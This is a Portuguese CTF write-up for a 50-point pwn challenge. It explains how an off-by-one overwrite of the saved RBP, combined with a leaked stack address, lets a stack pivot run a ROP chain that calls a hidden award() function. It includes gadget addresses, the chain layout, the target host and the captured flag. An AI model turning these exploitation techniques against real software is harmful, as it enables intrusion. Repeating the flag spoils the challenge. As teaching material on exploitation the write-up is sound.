# PoC — Maintenance Log (PWN, 50 pts) — #49

**Flag:** `CSSCTF{Duh_m4t3_1_4m_sl33py}`  *(encontrada via exploit remoto, não submetida)*

Alvo: `nc 34.116.80.78 7312`. Binário `chall` (x86-64, **No-PIE**, NX, Partial RELRO, com stack canary). Exploit completo: `exploit_49_maintenance_log.py`.

## Análise
- **`award()`** (0x401268): abre `flag.txt` e imprime a flag **se** chamada com `edi==0xdeadbeef` e `esi==0xcafebabe`. Nunca é chamada no fluxo normal.
- **`report()`** (0x40139a): `printf("[*] Report buffer allocated at: %p", buf)` → **vaza o endereço do buffer na stack** ("the interface IS LEAKING"). Depois `read(0, buf[0x50], 0x50)` (sem overflow aqui) e chama `tag()`.
- **`tag()`** (0x401348): `read(0, buf[0x20], 0x21)` → lê **33 bytes num buffer de 32** = **off-by-one** que sobrescreve o **LSB do saved RBP**.

## Cadeia do exploit
1. Receber o leak `L` = endereço do buffer de `report()` (= `rbp_report - 0x50`).
2. Enviar no buffer de `report()` um **ROP** começando no offset 8:
   ```
   [L+0]  = junk (vira rbp)
   [L+8]  = pop rdi ; ret   (0x40124d)
   [L+16] = 0xdeadbeef
   [L+24] = pop rsi ; ret   (0x40124f)
   [L+32] = 0xcafebabe
   [L+40] = award           (0x401268)
   ```
3. No `read` de `tag()`, enviar `32*'B' + (L & 0xff)` → corrige o LSB do saved RBP para `L`.
4. Ao retornar, `report()` executa `leave; ret` com o RBP corrompido → **stack pivot** para `L` → `ret` cai no ROP em `[L+8]` → chama `award(0xdeadbeef, 0xcafebabe)` → imprime a flag.

(O pivot exige `L & 0xff < 0xb0` para não haver borrow ao somar 0x50; o script reconecta até um leak favorável — ASLR re-randomiza por conexão.)

## Resultado
```
[try 0] L=0x7ffc6974b510 lowbyte=0x10 FLAG!
CSSCTF{Duh_m4t3_1_4m_sl33py}
```

## Lição
Um único byte de overflow no saved RBP ("off-by-one") + um leak de endereço de stack basta para pivotar a pilha e assumir o controle do fluxo, mesmo com stack canary intacto (o canary nunca é tocado).
